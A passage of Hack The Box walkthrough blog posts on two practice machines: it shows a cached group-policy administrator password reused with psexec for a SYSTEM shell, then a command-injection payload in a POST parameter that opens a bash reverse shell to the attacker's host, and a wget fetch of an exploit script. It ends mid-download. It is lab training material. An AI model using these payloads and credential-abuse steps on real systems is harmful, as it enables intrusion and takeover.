<br><br><br>PS C:\Users\mssql-svc\Desktop&gt; . .\PowerUp.ps1<br>. .\PowerUp.ps1<br>PS C:\Users\mssql-svc\Desktop&gt; Invoke-check<br>Invoke-check<br>Invoke-check : The term <span class="hljs-string">&#x27;Invoke-check&#x27;</span> is not recognized as the name of a cmdlet, <span class="hljs-keyword">function</span>, script file, or operable <br>program. Check the spelling of the name, or <span class="hljs-keyword">if</span> a path was included, verify that the path is correct and try again.<br>At line:1 char:1<br>+ Invoke-check<br>+ ~~~~~~~~~~~~<br>    + CategoryInfo          : ObjectNotFound: (Invoke-check:String) [], CommandNotFoundException<br>    + FullyQualifiedErrorId : CommandNotFoundException<br> <br>PS C:\Users\mssql-svc\Desktop&gt; Invoke-AllChecks<br>Invoke-AllChecks<br><br><br>Privilege   : SeImpersonatePrivilege<br>Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED<br>TokenHandle : 3268<br>ProcessId   : 880<br>Name        : 880<br>Check       : Process Token Privileges<br><br>ServiceName   : UsoSvc<br>Path          : C:\Windows\system32\svchost.exe -k netsvcs -p<br>StartName     : LocalSystem<br>AbuseFunction : Invoke-ServiceAbuse -Name <span class="hljs-string">&#x27;UsoSvc&#x27;</span><br>CanRestart    : True<br>Name          : UsoSvc<br>Check         : Modifiable Services<br><br>ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps<br>IdentityReference : QUERIER\mssql-svc<br>Permissions       : &#123;WriteOwner, Delete, WriteAttributes, Synchronize...&#125;<br>%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps<br>Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps<br>Check             : %PATH% .dll Hijacks<br>AbuseFunction     : Write-HijackDll -DllPath <span class="hljs-string">&#x27;C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#x27;</span><br><br>UnattendPath : C:\Windows\Panther\Unattend.xml<br>Name         : C:\Windows\Panther\Unattend.xml<br>Check        : Unattended Install Files<br><br>Changed   : &#123;2019-01-28 23:12:48&#125;<br>UserNames : &#123;Administrator&#125;<br>NewName   : [BLANK]<br>Passwords : &#123;MyUnclesAreMarioAndLuigi!!1!&#125;<br>File      : C:\ProgramData\Microsoft\Group <br>            Policy\History\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Preferences\Groups\Groups.xml<br>Check     : Cached GPP Files<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ psexec.py Administrator:<span class="hljs-string">&#x27;MyUnclesAreMarioAndLuigi!!1!&#x27;</span>@10.10.10.125 <span class="hljs-string">&quot;cmd&quot;</span> <br>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation<br><br>[*] Requesting shares on 10.10.10.125.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file ATUPOlkP.exe<br>[*] Opening SVCManager on 10.10.10.125.....<br>[*] Creating service gSsv on 10.10.10.125.....<br>[*] Starting service gSsv.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.292]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br><br>C:\Windows\system32&gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Previse</title>
    <link href="/post/HackTheBox-Previse.html"/>
    <url>/post/HackTheBox-Previse.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-Previse"><a href="#HTB-Walkthrough-Previse" class="headerlink" title="HTB Walkthrough - Previse"></a>HTB Walkthrough - Previse</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 06:22:37 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.104                                    <br>Discovered open port 22/tcp on 10.10.11.104 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.104<br>Host is up (0.16s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)<br>|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)<br>|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| http-title: Previse Login<br>|_Requested resource was login.php<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.49 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://previse.htb<br>http://previse.htb [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517143451810.png" alt="image-20220517143451810"  /><p>都会被重定向：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://previse.htb -e php    <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940<br><br>Output File: /home/mosaictheory/.dirsearch/reports/previse.htb/_22-05-17_14-32-48.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_14-32-48.<span class="hljs-built_in">log</span><br><br>Target: http://previse.htb/<br>[14:33:11] 302 -    4KB - /accounts.php  -&gt;  login.php<br>[14:33:25] 200 -    0B  - /config.php<br>[14:33:27] 301 -  308B  - /css  -&gt;  http://previse.htb/css/<br>[14:33:29] 302 -    0B  - /download.php  -&gt;  login.php<br>[14:33:31] 200 -   15KB - /favicon.ico<br>[14:33:31] 302 -    5KB - /files.php  -&gt;  login.php<br>[14:33:31] 200 -  217B  - /footer.php<br>[14:33:32] 200 -  980B  - /header.php<br>[14:33:34] 302 -    3KB - /index.php  -&gt;  login.php<br>[14:33:34] 302 -    3KB - /index.php/login/  -&gt;  login.php<br>[14:33:35] 200 -    1KB - /js/<br>[14:33:35] 301 -  307B  - /js  -&gt;  http://previse.htb/js/<br>[14:33:38] 200 -    2KB - /login.php<br>[14:33:38] 302 -    0B  - /logout.php  -&gt;  login.php<br>[14:33:49] 403 -  276B  - /server-status<br>[14:33:49] 403 -  276B  - /server-status/<br>[14:33:52] 302 -    3KB - /status.php  -&gt;  login.php<br></code></pre></td></tr></table></figure><p>浏览器访问会被重定向，但是curl是可以捕获到目标正常响应页面的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://previse.htb<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;<span class="hljs-built_in">head</span>&gt;<br>        &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    <br>            <br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Previse rocks your socks.&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;author&quot;</span> content=<span class="hljs-string">&quot;m4lwhere&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;shortcut icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;apple-touch-icon&quot;</span> sizes=<span class="hljs-string">&quot;180x180&quot;</span> href=<span class="hljs-string">&quot;/apple-touch-icon.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span> sizes=<span class="hljs-string">&quot;32x32&quot;</span> href=<span class="hljs-string">&quot;/favicon-32x32.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span> sizes=<span class="hljs-string">&quot;16x16&quot;</span> href=<span class="hljs-string">&quot;/favicon-16x16.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;manifest&quot;</span> href=<span class="hljs-string">&quot;/site.webmanifest&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/uikit.min.css&quot;</span> /&gt;<br>        &lt;script src=<span class="hljs-string">&quot;js/uikit.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script src=<span class="hljs-string">&quot;js/uikit-icons.min.js&quot;</span>&gt;&lt;/script&gt;<br>   <br><br>&lt;title&gt;Previse Home&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    <br>&lt;nav class=<span class="hljs-string">&quot;uk-navbar-container&quot;</span> uk-navbar&gt;<br>    &lt;div class=<span class="hljs-string">&quot;uk-navbar-center&quot;</span>&gt;<br>        &lt;ul class=<span class="hljs-string">&quot;uk-navbar-nav&quot;</span>&gt;<br>            &lt;li class=<span class="hljs-string">&quot;uk-active&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;/index.php&quot;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;accounts.php&quot;</span>&gt;ACCOUNTS&lt;/a&gt;<br>                &lt;div class=<span class="hljs-string">&quot;uk-navbar-dropdown&quot;</span>&gt;<br>                    &lt;ul class=<span class="hljs-string">&quot;uk-nav uk-navbar-dropdown-nav&quot;</span>&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;accounts.php&quot;</span>&gt;CREATE ACCOUNT&lt;/a&gt;&lt;/li&gt;<br>                    &lt;/ul&gt;<br>                &lt;/div&gt;<br>            &lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;files.php&quot;</span>&gt;FILES&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;status.php&quot;</span>&gt;MANAGEMENT MENU&lt;/a&gt;<br>                &lt;div class=<span class="hljs-string">&quot;uk-navbar-dropdown&quot;</span>&gt;<br>                    &lt;ul class=<span class="hljs-string">&quot;uk-nav uk-navbar-dropdown-nav&quot;</span>&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;status.php&quot;</span>&gt;WEBSITE STATUS&lt;/a&gt;&lt;/li&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;file_logs.php&quot;</span>&gt;LOG DATA&lt;/a&gt;&lt;/li&gt;<br>                    &lt;/ul&gt;<br>                &lt;/div&gt;<br>            &lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span> class=<span class="hljs-string">&quot;.uk-text-uppercase&quot;</span>&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;logout.php&quot;</span>&gt;<br>                    &lt;button class=<span class="hljs-string">&quot;uk-button uk-button-default uk-button-small&quot;</span>&gt;LOG OUT&lt;/button&gt;<br>                &lt;/a&gt;<br>            &lt;/li&gt;<br>        &lt;/ul&gt;<br>    &lt;/div&gt;<br>&lt;/nav&gt;<br><br>    &lt;section class=<span class="hljs-string">&quot;uk-section uk-section-default&quot;</span>&gt;<br>        &lt;div class=<span class="hljs-string">&quot;uk-container&quot;</span>&gt;<br>            &lt;h2 class=<span class="hljs-string">&quot;uk-heading-divider&quot;</span>&gt;Previse File Hosting&lt;/h2&gt;<br>            &lt;p&gt;Previse File Hosting Service Management.&lt;/p&gt;<br>            &lt;p&gt;Don<span class="hljs-string">&#x27;t have an account? Create one!&lt;/p&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/section&gt;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">&lt;div class=&quot;uk-position-bottom-center uk-padding-small&quot;&gt;</span><br><span class="hljs-string">&lt;a href=&quot;https://m4lwhere.org/&quot; target=&quot;_blank&quot;&gt;&lt;button class=&quot;uk-button uk-button-text uk-text-small&quot;&gt;Created by m4lwhere&lt;/button&gt;&lt;/a&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br></code></pre></td></tr></table></figure><p>可能该重定向是在前端。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517151142957.png" alt="image-20220517151142957"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517151200028.png" alt="image-20220517151200028"  /><p>可以手动把302改成200：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517151239939.png" alt="image-20220517151239939"  /><p>一样的，选择ACCOUNTS：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517151447316.png" alt="image-20220517151447316"  /><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/accounts.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>previse.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://previse.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://previse.htb/accounts.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8j4orelok55b33gs1djn3105m3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>hacker<span class="hljs-variable">&amp;password</span>=whoami<span class="hljs-variable">&amp;confirm</span>=whoami<span class="hljs-variable">&amp;submit</span>=</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517151652627.png" alt="image-20220517151652627"  /><p>可以正式登录了，而且我可以下载到目标的源码：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517155219346.png" alt="image-20220517155219346"></p><p>在logs.php文件中，会有PHP一些危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-comment">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//</span><br><span class="hljs-comment">/////////////////////////////////////////////////////////////////////////////////////</span><br><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/usr/bin/python /opt/scripts/log_process.py <span class="hljs-subst">&#123;$_POST[&#x27;delim&#x27;]&#125;</span>&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&quot;/var/www/out.log&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;out.log&quot;</span>;    <br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filepath</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filepath</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>    <span class="hljs-title function_ invoke__">ob_clean</span>(); <span class="hljs-comment">// Discard data in the output buffer</span><br>    <span class="hljs-title function_ invoke__">flush</span>(); <span class="hljs-comment">// Flush system headers</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">404</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>它在调用python执行&#x2F;log_process.py对用户提交的post参数进行处理，而且没有任何过滤，这里或许会存在RCE，脚本对应的地址：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517155729507.png" alt="image-20220517155729507"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517155748185.png" alt="image-20220517155748185"  /><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/logs.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>previse.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>62<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://previse.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://previse.htb/file_logs.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8j4orelok55b33gs1djn3105m3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-apache"><span class="hljs-attribute">delim</span>=comma;bash -c &#x27;bash -i &gt;%<span class="hljs-number">26</span> /dev/tcp/<span class="hljs-number">10.10.16.7</span>/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;%<span class="hljs-number">261</span>&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 53904<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1413): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@previse:/var/www/html$ <br></code></pre></td></tr></table></figure><h4 id="Elevated-privileges-number-one："><a href="#Elevated-privileges-number-one：" class="headerlink" title="Elevated privileges number one："></a>Elevated privileges number one：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ wget http://10.10.16.7/CVE-2021-2043.py<br>--2022-05-17 08:03:43--  http://10.10.16.7/CVE-2021-2043.py<br>Connecting to 